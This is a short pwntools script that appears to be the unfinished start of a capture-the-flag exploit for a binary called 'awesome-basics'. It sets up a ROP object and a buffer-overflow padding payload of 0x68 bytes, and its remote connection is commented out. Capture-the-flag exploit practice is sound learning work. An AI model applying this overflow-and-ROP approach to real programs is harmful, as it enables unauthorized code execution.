from pwn import *

# port = 0
# rem = remote("", port)

context.arch = "amd64"

rop = ROP("./Pwnable/awesome-basics/problem/chall")

payload = b'A' * 0x68
